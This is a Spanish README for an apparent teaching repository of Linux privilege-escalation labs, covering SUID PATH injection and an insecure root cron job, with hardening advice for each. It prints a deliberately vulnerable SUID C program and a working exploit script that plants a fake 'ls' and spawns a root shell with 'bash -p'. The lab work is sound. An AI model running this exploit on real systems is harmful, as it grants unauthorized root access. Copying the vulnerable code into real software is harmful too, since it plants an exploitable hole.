# Laboratorios de Escalada de Privilegios en Linux

Una colección práctica de laboratorios diseñada para enseñar **técnicas fundamentales de escalada de privilegios local en Linux**. Estos laboratorios son perfectos para estudiantes de ciberseguridad, aspirantes a pentesters y cualquiera que busque profundizar su comprensión de la seguridad y el hardening de sistemas Linux.

Cada laboratorio incluye:
* Una **descripción clara** de la vulnerabilidad.
* **Prerrequisitos** para configurar tu entorno de laboratorio.
* **Scripts de configuración automática** para crear el escenario vulnerable.
* **Scripts de explotación** para demostrar cómo funciona el ataque.
* **Scripts de verificación** para confirmar el éxito de la escalada de privilegios.
* **Scripts de reversión y hardening** para limpiar el laboratorio y aprender estrategias de mitigación.

---

## Tabla de Contenidos

1.  [**Prerrequisitos y Configuración del Laboratorio**](#1-prerrequisitos-y-configuración-del-laboratorio)
2.  [**Laboratorio 1: Explotación de Binario SUID (Inyección de PATH)**](#2-laboratorio-1-explotación-de-binario-suid-inyección-de-path)
    * [Descripción de la Vulnerabilidad](#descripción-de-la-vulnerabilidad-1)
    * [Archivos del Laboratorio](#archivos-del-laboratorio-1)
    * [Ejecución del Laboratorio Paso a Paso](#ejecución-del-laboratorio-paso-a-paso-1)
    * [Vulnerabilidad y Hardening](#vulnerabilidad-y-hardening-1)
3.  [**Laboratorio 2: Explotación de Tarea Cron Insegura**](#3-laboratorio-2-explotación-de-tarea-cron-insegura)
    * [Descripción de la Vulnerabilidad](#descripción-de-la-vulnerabilidad-2)
    * [Archivos del Laboratorio](#archivos-del-laboratorio-2)
    * [Ejecución del Laboratorio Paso a Paso](#ejecución-del-laboratorio-paso-a-paso-2)
    * [Vulnerabilidad y Hardening](#vulnerabilidad-y-hardening-2)

---

## 1. Prerrequisitos y Configuración del Laboratorio

Para ejecutar estos laboratorios con éxito, necesitarás un entorno Linux aislado.

### Entorno Recomendado: Ubuntu Server 24.04 LTS

* **WSL (Subsistema de Windows para Linux):** La forma más sencilla de empezar en Windows.
    1.  Abre la Microsoft Store, busca "Ubuntu 24.04 LTS" e instálalo.
    2.  Inicia Ubuntu desde tu Menú de Inicio y sigue las instrucciones para crear un **usuario no-root** (ej. `estudiante`). Este será tu usuario principal para los laboratorios.
* **Máquina Virtual (VM):** Para una configuración más tradicional (VirtualBox, VMware, Proxmox).
    1.  Descarga la [ISO de Ubuntu Server 24.04 LTS](https://ubuntu.com/download/server).
    2.  Crea una nueva VM con al menos 2GB de RAM y 20GB de espacio en disco.
    3.  Instala Ubuntu Server, asegurándote de crear un **usuario no-root** durante la configuración (ej. `estudiante`).
    4.  *(Opcional pero Recomendado)* Instala `openssh-server` para facilitar el copiado de comandos y la administración remota:
        ```bash
        sudo apt update
        sudo apt install -y openssh-server
        sudo ufw allow ssh # Permite SSH si ufw está activo
        sudo ufw enable
        ```

### Clonar el Repositorio

Una vez que tu entorno Ubuntu esté listo y hayas iniciado sesión como tu **usuario no-root**:

```bash
git clone [https://github.com/tu-nombre-de-usuario/linux-escalada-privilegios.git](https://github.com/tu-nombre-de-usuario/linux-escalada-privilegios.git)
cd linux-escalada-privilegios
```

(Nota: Recuerda reemplazar tu-nombre-de-usuario con tu nombre de usuario real de GitHub una vez que hayas creado el repositorio y subido los archivos.)

## 2. Laboratorio 1: Explotación de Binario SUID (Inyección de PATH)
Este laboratorio demuestra cómo un binario SUID mal configurado puede llevar a privilegios de root mediante la manipulación de variables de entorno.

### Descripción de la Vulnerabilidad
Un binario propiedad de root tiene el bit SUID (Set User ID) habilitado, lo que le permite ejecutarse con privilegios de root. Fundamentalmente, este binario ejecuta comandos externos (como ls) sin especificar su ruta absoluta (por ejemplo, system("ls -la /root") en lugar de system("/bin/ls -la /root")). Un atacante puede explotar esto manipulando su variable de entorno PATH para que incluya un directorio controlado por él. Al colocar un "falso" ls malicioso en este directorio, el binario SUID ejecutará el ls del atacante como root en lugar del legítimo.

### Archivos del Laboratorio
* lab1_suid_path/00_setup_lab.sh: Configura el programa SUID vulnerable.
* lab1_suid_path/01_exploit.sh: Ejecuta el ataque de inyección de PATH.
* lab1_suid_path/02_verify_exploit.sh: Verifica si se obtuvieron privilegios de root.
* lab1_suid_path/03_revert_fix.sh: Revierte los cambios y demuestra el hardening.

Ejecución del Laboratorio Paso a Paso
Navega al directorio del laboratorio:

```bash
cd lab1_suid_path
```

### 1. Configurar el Entorno Vulnerable:

 * Propósito: Este script compilará un pequeño programa en C, lo hará propiedad de root y establecerá su bit SUID.

 * Ejecutar como: Tu usuario no-root, usando sudo.

```bash

sudo ./00_setup_lab.sh
```

* Salida Esperada: Mensajes de confirmación sobre la creación del directorio, la compilación y la configuración exitosa del bit SUID (verás una s en rws en los permisos del archivo).

### 2. Ejecutar el Ataque:

 * Propósito: Este script creará un ls malicioso en un directorio temporal, lo agregará a tu PATH y luego ejecutará el programa vulnerable SUID.
 * Ejecutar como: Tu usuario no-root.

```Bash

./01_exploit.sh
```
* Salida Esperada: El script primero ejecutará el programa vulnerable, mostrará su salida normal, luego preparará el ls malicioso, y finalmente, ejecutará el programa vulnerable de nuevo. ¡Deberías obtener un nuevo prompt de shell, indicando que eres root!

### Verificar la Explotación:

* Propósito: Después de obtener la shell de root en el paso anterior, este script confirmará tu ID de usuario actual.
* Ejecutar como: root (dentro de la shell de root recién obtenida).

```Bash

./02_verify_exploit.sh
```
* Salida Esperada: Un mensaje de éxito claro que indica UID=0(root). Para salir de la shell de root, simplemente escribe exit.
* Revertir Cambios y Aprender Hardening:

* Propósito: Este script eliminará el programa vulnerable, limpiará los archivos maliciosos y explicará cómo prevenir este tipo de ataque.
* Ejecutar como: Tu usuario no-root, usando sudo.

```Bash

sudo ./03_revert_fix.sh
```
* Salida Esperada: Confirmación de que el entorno vulnerable ha sido limpiado y un resumen de los principios de hardening.

### Vulnerabilidad y Hardening
Vulnerabilidad:

* SUID mal configurado: Un programa con privilegios elevados (SUID root) llama a comandos externos sin especificar rutas absolutas.
* Manipulación de variables de entorno: La variable PATH puede ser controlada por un atacante para inyectar ejecutables maliciosos.

### Medidas de Hardening:

1. Usar siempre Rutas Absolutas: En programas SUID, utiliza siempre la ruta completa para comandos externos (ej. /bin/ls en lugar de ls).
2. Sanear Variables de Entorno: Los programas SUID deben limpiar o establecer explícitamente variables de entorno críticas (PATH, LD_PRELOAD, etc.) a valores seguros conocidos.
3. Principio del Menor Privilegio: Solo otorga SUID si es absolutamente esencial. Reevalúa si una tarea puede realizarse con privilegios más bajos.
4. Auditorías regulares de SUID: Revisa periódicamente tu sistema en busca de binarios SUID con sudo find / -type f -perm /4000 2>/dev/null y elimina el SUID de binarios innecesarios o riesgosos.

## 3. Laboratorio 2: Explotación de Tarea Cron Insegura
Este laboratorio demuestra cómo los permisos de archivo laxos combinados con una tarea cron de root pueden llevar a la escalada de privilegios.

### Descripción de la Vulnerabilidad
Una tarea programada (cron job) está configurada para ejecutarse periódicamente como root. El script o comando que ejecuta esta tarea reside en un directorio con permisos de escritura globales (por ejemplo, chmod 777). Un atacante, como usuario con pocos privilegios, puede modificar este script para insertar comandos maliciosos. Cuando se ejecuta la tarea cron, ejecutará los comandos maliciosos del atacante con privilegios de root.

## Archivos del Laboratorio

* lab2_insecure_cron/00_setup_lab.sh: Configura el directorio con permisos de escritura globales y la tarea cron de root.
* lab2_insecure_cron/01_exploit.sh: Modifica el script cron con un payload.
* lab2_insecure_cron/02_verify_exploit.sh: Verifica si se obtuvieron privilegios de root (comprobando SUID en /bin/bash).
* lab2_insecure_cron/03_revert_fix.sh: Revierte los cambios y demuestra el hardening.

### Ejecución del Laboratorio Paso a Paso
Navega al directorio del laboratorio:

```Bash

cd lab2_insecure_cron
```
### Configurar el Entorno Vulnerable:

* Propósito: Este script creará un directorio con permisos 777, colocará un script de ejemplo dentro y configurará una tarea cron de root para ejecutar este script cada minuto.
* Ejecutar como: Tu usuario no-root, usando sudo.

```Bash

sudo ./00_setup_lab.sh
```
* Salida Esperada: Mensajes de confirmación sobre la creación del directorio (con permisos rwxrwxrwx), la configuración del script y la adición de la tarea cron.
* Ejecutar el Ataque:
* Propósito: Este script verificará los permisos de escritura y luego modificará el script de la tarea cron. El payload inyectado establecerá el bit SUID en /bin/bash cuando la tarea cron se ejecute como root.

### Ejecutar como: Tu usuario no-root.

```Bash

./01_exploit.sh
```
* Salida Esperada: Mensajes que confirman el acceso de escritura y la modificación del script. Te indicará esperar hasta 60 segundos para que la tarea cron ejecute el payload.

### Verificar la Explotación:

* Propósito: Después de esperar, este script comprueba si /bin/bash ahora tiene el bit SUID. Si es así, intentará proporcionarte una shell de root.
* Ejecutar como: Tu usuario no-root.

```Bash

./02_verify_exploit.sh
```
* Salida Esperada: Debería confirmar que /bin/bash tiene el bit SUID. ¡Deberías obtener un nuevo prompt de shell, indicando que eres root! Usa id para verificar, luego exit para volver a tu usuario no-root.
* Revertir Cambios y Aprender Hardening:
* Propósito: Este script eliminará el bit SUID de /bin/bash, eliminará la tarea cron de root, limpiará el directorio vulnerable y explicará los principios de hardening.
* Ejecutar como: Tu usuario no-root, usando sudo.

```Bash

sudo ./03_revert_fix.sh
```
* Salida Esperada: Confirmación de que los cambios se han revertido y un resumen de las medidas de hardening.

## Vulnerabilidad y Hardening
### Vulnerabilidad:

* Permisos de archivo/directorio inseguros: Un directorio o script propiedad de root (o utilizado por una tarea cron de root) tiene permisos de escritura globales (777 o similar), lo que permite que cualquier usuario lo modifique.
* Tarea cron de root: Una tarea programada para ejecutarse como root proporciona una ventana de oportunidad para la escalada de privilegios si el script ejecutado está comprometido.
### Medidas de Hardening:
1. Permisos Estrictos de Archivos y Directorios: Los directorios o scripts utilizados por las tareas cron de root NO deben ser escribibles por usuarios no privilegiados. Usa chmod 755 (o más estricto) y asegúrate de que root sea el propietario.
2. Rutas Absolutas en Crontabs: Siempre especifica la ruta completa a los ejecutables en las tareas cron (ej. /usr/bin/php, /bin/bash).
3. Principio del Menor Privilegio: Las tareas cron deben ejecutarse con los privilegios más bajos posibles requeridos. Si un trabajo no necesita root, ejecútalo como un usuario con menos privilegios.
4. Auditorías regulares de Tareas Cron: Revisa periódicamente la crontab de root (sudo crontab -l) y /etc/crontab en busca de entradas sospechosas o mal configuradas.

## Contribuciones
¡Siéntete libre de abrir issues o pull requests si tienes sugerencias para mejoras, nuevos laboratorios o encuentras algún error!

## Licencia
Este proyecto es de código abierto y está disponible bajo la Licencia MIT.


### 3. Contenido de los Scripts y Archivos Auxiliares

**`lab1_suid_path/00_setup_lab.sh`**

```bash
#!/bin/bash
# 00_setup_lab.sh - Script para configurar el entorno SUID vulnerable
# Este script DEBE ejecutarse con sudo.

echo "--- Iniciando configuración del laboratorio SUID vulnerable ---"

# --- Paso 1: Instalar dependencias si es necesario ---
echo "[1/5] Actualizando el sistema e instalando build-essential (para gcc)..."
sudo apt update -y > /dev/null 2>&1
sudo apt install -y build-essential > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "ERROR: Falló la instalación de build-essential. ¿Estás conectado a internet?"
    exit 1
fi
echo "    Dependencias instaladas."

# --- Paso 2: Crear el directorio vulnerable ---
VULN_DIR="/opt/vulnerable_app_suid"
echo "[2/5] Creando el directorio vulnerable: $VULN_DIR"
sudo mkdir -p "$VULN_DIR"
sudo chown root:root "$VULN_DIR"
sudo chmod 755 "$VULN_DIR" # Permisos estándar para el directorio
echo "    Directorio creado y con permisos correctos."

# --- Paso 3: Crear el código fuente del programa SUID vulnerable ---
VULN_C_FILE="$VULN_DIR/vulnerable_program.c"
echo "[3/5] Creando el código fuente del programa vulnerable en $VULN_C_FILE"
sudo tee "$VULN_C_FILE" > /dev/null <<EOF
#include <stdio.h>
#include <stdlib.h> // Para system()
#include <unistd.h> // Para getuid()

int main() {
    printf("[PROGRAMA VULNERABLE]: ¡Hola desde el programa SUID!\n");
    printf("[PROGRAMA VULNERABLE]: Mi UID efectivo es: %d\n", geteuid());
    // La vulnerabilidad: llama a 'ls' sin ruta absoluta.
    // Esto permite que el atacante inyecte su propio 'ls'.
    printf("[PROGRAMA VULNERABLE]: Intentando ejecutar 'ls -la /root'...\n");
    system("ls -la /root"); 
    printf("[PROGRAMA VULNERABLE]: Ejecución de 'ls' terminada.\n");
    return 0;
}
EOF
echo "    Código fuente creado."

# --- Paso 4: Compilar el programa ---
VULN_BIN="$VULN_DIR/vulnerable_program"
echo "[4/5] Compilando el programa vulnerable en $VULN_BIN"
sudo gcc "$VULN_C_FILE" -o "$VULN_BIN"
if [ $? -ne 0 ]; then
    echo "ERROR: Falló la compilación del programa. Revisa el código fuente."
    exit 1
fi
echo "    Programa compilado exitosamente."

# --- Paso 5: Establecer la propiedad de root y el bit SUID ---
echo "[5/5] Estableciendo propietario root y el bit SUID para $VULN_BIN"
sudo chown root:root "$VULN_BIN"
sudo chmod 4755 "$VULN_BIN" # u=rws (usuario leer, escribir, setuid), go=rx (grupo/otros leer, ejecutar)
echo "    Permisos establecidos. Verificando..."
ls -la "$VULN_BIN" | grep "rws"
if [ $? -eq 0 ]; then
    echo "    ¡Configuración SUID exitosa! La 's' en 'rws' lo confirma."
else
    echo "ERROR: El bit SUID no se estableció correctamente. Revisa los pasos."
    exit 1
fi

echo "--- Configuración del laboratorio SUID vulnerable completada. ---"
echo "Ahora, ejecuta './01_exploit.sh' como tu usuario normal para intentar la escalada."

```
#### lab1_suid_path/01_exploit.sh

```bash
#!/bin/bash
# 01_exploit.sh - Script para ejecutar la explotación de SUID+PATH
# Este script DEBE ejecutarse como un usuario NO-ROOT.

echo "--- Iniciando intento de explotación SUID+PATH ---"

# --- Paso 1: Verificar el usuario actual ---
echo "[1/4] Verificando usuario actual..."
CURRENT_USER=$(whoami)
echo "    Actualmente logueado como: $CURRENT_USER"
if [ "$CURRENT_USER" == "root" ]; then
    echo "ADVERTENCIA: Estás como root. Este script debe ser ejecutado por un usuario no-root."
    echo "Por favor, sal de la sesión de root y ejecuta como un usuario normal."
    exit 1
fi

# --- Paso 2: Ejecutar el programa vulnerable sin PATH modificado (primera prueba) ---
VULN_BIN="/opt/vulnerable_app_suid/vulnerable_program"
echo "[2/4] Ejecutando el programa vulnerable sin PATH modificado..."
"$VULN_BIN"
echo "    Observa la salida anterior. El 'ls' probablemente falló o no mostró /root."

# --- Paso 3: Preparar el PATH malicioso ---
MALICIOUS_DIR="/tmp/pwned_path_suid"
MALICIOUS_LS="$MALICIOUS_DIR/ls"
echo "[3/4] Creando directorio malicioso y falso 'ls' en $MALICIOUS_DIR"
mkdir -p "$MALICIOUS_DIR"
if [ $? -ne 0 ]; then
    echo "ERROR: No se pudo crear el directorio malicioso. ¿Permisos?"
    exit 1
fi

# El 'ls' falso que nos dará una shell de root
tee "$MALICIOUS_LS" > /dev/null <<EOF
#!/bin/bash
echo "[ATAQUE]: ¡Tu 'ls' malicioso ha sido ejecutado como Root!"
/bin/bash -p # La clave: Obtener una shell con los privilegios del proceso padre (root)
EOF
chmod +x "$MALICIOUS_LS"
echo "    Falso 'ls' creado y ejecutable."

echo "    Manipulando la variable PATH..."
export PATH="$MALICIOUS_DIR:$PATH"
echo "    PATH actual (verás $MALICIOUS_DIR al principio): $PATH"

# --- Paso 4: Ejecutar el programa vulnerable DE NUEVO con el PATH modificado ---
echo "[4/4] Ejecutando el programa vulnerable de nuevo. ¡Prepara la shell de Root!"
echo "    Si todo va bien, deberías ver una nueva shell con 'root@...' y un prompt diferente."
echo "    Usa 'id' para verificar tus privilegios."
echo "    Para salir de la shell de root, escribe 'exit'."
echo ""

"$VULN_BIN"

# Después de salir de la shell de root, este script continúa
echo "--- Explotación SUID+PATH finalizada. ---"
echo "Si obtuviste la shell de root y la verificaste con 'id', ¡felicidades!"
echo "Ahora, ejecuta './03_revert_fix.sh' con 'sudo' para limpiar el laboratorio."
```
